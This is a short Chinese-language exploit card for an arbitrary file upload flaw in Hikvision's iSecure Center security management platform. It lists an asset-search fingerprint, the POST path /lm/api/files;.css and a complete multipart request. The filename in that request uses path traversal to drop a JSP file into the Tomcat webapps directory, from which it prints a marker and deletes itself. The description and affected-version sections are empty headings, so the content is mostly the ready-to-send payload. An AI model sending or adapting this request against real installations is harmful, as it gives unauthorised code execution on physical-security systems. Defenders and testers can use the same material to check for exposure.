# 海康威视iSecureCenter综合安防管理平台lm任意文件上传漏洞

- **系统**：海康　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name=="Hikvision 海康威视 iSecure Center"`
- **请求**：`POST /lm/api/files;.css HTTP/1.1`
- **关键头**：`Host: 192.168.110.74`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8Q…`　`Content-Length: 342`　`SL-CE-SUID: 39`

**请求体 / payload**
```
------WebKitFormBoundaryVBf7Cs8QWsfwC82M
Content-Disposition: form-data; name="file"; filename="../../../../../tomcat85linux64.1/webapps/els/static/axaaxs.jsp"
Content-Type: application/zip
<% out.println("testaxssax");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryVBf7Cs8QWsfwC82M--

上传文件位置
/els/static/axaaxs.jsp
```

**其他**
- 海康威视iSecure Center综合安防管理平台lm任意文件上传漏洞: * 1、漏洞描述
* 2、影响版本
* 3、资产测绘
* 4、漏洞复现
***
- 版本: HIKVISION iSecure Center综合安防管理平台\